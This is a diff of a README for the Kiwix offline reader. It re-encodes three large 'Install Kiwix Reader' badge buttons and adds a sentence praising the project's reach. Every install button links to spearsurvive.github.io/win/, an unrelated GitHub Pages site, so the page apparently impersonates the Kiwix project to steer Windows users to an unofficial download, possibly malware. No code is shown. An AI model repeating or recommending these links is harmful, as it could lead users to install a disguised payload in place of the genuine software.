@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,7 +30,7 @@
 
 ## 📖 About Kiwix Reader
 
-Kiwix is a free, open-source offline reader for Wikipedia, Project Gutenberg, Stack Exchange, and hundreds of other web-based knowledge resources. Download ZIM files for offline access to entire websites — perfect for areas with unreliable internet.
+Kiwix is a free, open-source offline reader for Wikipedia, Project Gutenberg, Stack Exchange, and hundreds of other web-based knowledge resources. Download ZIM files for offline access to entire websites — perfect for areas with unreliable internet. Used by educators, travelers, and humanitarian organizations worldwide to provide access to knowledge without connectivity.
 
 ---
 
@@ -81,7 +81,7 @@ Kiwix is a free, open-source offline reader for Wikipedia, Project Gutenberg, St
 
 <div align="center">
 
-[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Kiwix is a free, open-source offline reader for Wikipedia, Project Gutenberg, St
 
 <div align="center">
 
-[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix%20Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Kiwix Reader](https://img.shields.io/badge/⬇_Install_Kiwix+Reader-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
